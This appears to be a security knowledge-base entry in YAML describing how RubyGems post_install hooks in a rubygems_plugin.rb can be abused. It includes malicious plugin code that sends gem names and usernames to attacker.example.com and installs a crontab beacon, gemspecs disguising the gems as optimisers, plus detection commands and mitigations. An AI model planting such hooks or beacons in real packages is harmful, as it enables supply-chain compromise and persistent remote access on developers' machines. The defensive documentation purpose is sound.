---
name: "RubyGems Install Hook Abuse"
packageManager: "gem"
slug: "gem-install-hooks"
category: "Code Execution"
severity: "high"
platform:
  - "Linux"
  - "macOS"
  - "Windows"
description: "RubyGems supports pre_install and post_install hooks that execute Ruby code during any gem installation. These hooks can be registered via the RubyGems plugin system by placing a `rubygems_plugin.rb` file in a gem's `lib/` directory, which RubyGems auto-loads. An attacker who publishes a gem containing a malicious RubyGems plugin can execute arbitrary code every time the victim installs any gem, turning the package manager itself into a persistent backdoor."
prerequisites:
  - "Write access to the victim's ~/.gemrc or RubyGems plugin directory"
  - "Alternatively, the ability to publish a gem that registers itself as a RubyGems plugin"
  - "The victim must subsequently run gem install for any package"
attackScenarios:
  - title: "Malicious RubyGems Plugin with post_install Hook"
    description: "An attacker creates a gem that registers itself as a RubyGems plugin. Once installed, the plugin's post_install hook executes arbitrary Ruby code every time the victim installs any subsequent gem. This provides persistent code execution that survives across multiple gem operations."
    commands:
      - label: "Create a malicious RubyGems plugin gem"
        code: |
          # lib/rubygems_plugin.rb
          # This file is automatically loaded by RubyGems when present
          # in an installed gem's lib/ directory

          Gem.post_install do |installer|
            # Runs after every gem install
            gem_name = installer.spec.name
            system("curl -s https://attacker.example.com/log?gem=#{gem_name}&user=#{ENV['USER']}")

            # Establish persistence via crontab
            unless `crontab -l 2>/dev/null`.include?("updater")
              system("(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s https://attacker.example.com/beacon') | crontab -")
            end
          end
        language: "ruby"
      - label: "Gemspec for the plugin gem"
        code: |
          Gem::Specification.new do |s|
            s.name    = "rubygems-optimizer"
            s.version = "1.0.0"
            s.summary = "Optimizes gem installations"
            s.authors = ["attacker"]
            s.files   = ["lib/rubygems_plugin.rb"]
          end
        language: "ruby"
      - label: "Once installed, every subsequent gem install triggers the hook"
        code: |
          # After victim installs the plugin gem:
          gem install rubygems-optimizer

          # Every future gem install triggers the malicious hook:
          gem install rails  # This silently runs the attacker's post_install code
        language: "bash"
  - title: "Malicious rubygems_plugin.rb Auto-Loaded by RubyGems"
    description: "An attacker publishes a gem containing a `lib/rubygems_plugin.rb` file. RubyGems automatically loads any file named `rubygems_plugin.rb` found in an installed gem's `lib/` directory. The plugin registers a `Gem.post_install` hook that executes arbitrary code every time the victim installs any subsequent gem. Unlike `.gemrc` (which is a YAML configuration file and does not support inline Ruby code), this is a legitimate RubyGems extension mechanism that can be abused."
    commands:
      - label: "Malicious rubygems_plugin.rb that registers a persistent hook"
        code: |
          # lib/rubygems_plugin.rb
          # Auto-loaded by RubyGems from any installed gem's lib/ directory

          Gem.post_install do |installer|
            require 'net/http'
            gem_name = installer.spec.name
            uri = URI("https://attacker.example.com/hook?gem=#{gem_name}&user=#{ENV['USER']}")
            Net::HTTP.get(uri) rescue nil
          end
        language: "ruby"
      - label: "Gemspec for the plugin gem"
        code: |
          Gem::Specification.new do |s|
            s.name    = "rubygems-perf-helper"
            s.version = "1.0.0"
            s.summary = "Performance helper for gem operations"
            s.authors = ["attacker"]
            s.files   = ["lib/rubygems_plugin.rb"]
          end
        language: "ruby"
detection:
  - title: "List installed RubyGems plugins"
    description: "Search for installed gems that contain a rubygems_plugin.rb file, which is automatically loaded by RubyGems."
    commands:
      - code: "find $(gem environment gemdir)/gems -name 'rubygems_plugin.rb' -exec echo '=== {} ===' \\; -exec cat {} \\;"
        language: "bash"
  - title: "Check gem environment for hook paths"
    description: "Review the full gem environment configuration for unexpected settings."
    commands:
      - code: "gem environment"
        language: "bash"
mitigation:
  - "Regularly audit installed gems for rubygems_plugin.rb files using find or gem contents"
  - "Review any rubygems_plugin.rb files for suspicious hook registrations"
  - "Monitor file modification events on the gem plugin directories"
  - "Use containerized environments for gem installation to limit persistence"
references:
  - title: "RubyGems Plugins Guide"
    url: "https://guides.rubygems.org/plugins/"
  - title: "RubyGems API - Gem.post_install"
    url: "https://docs.ruby-lang.org/en/master/Gem.html"
created: 2026-04-02
updated: 2026-04-02
---
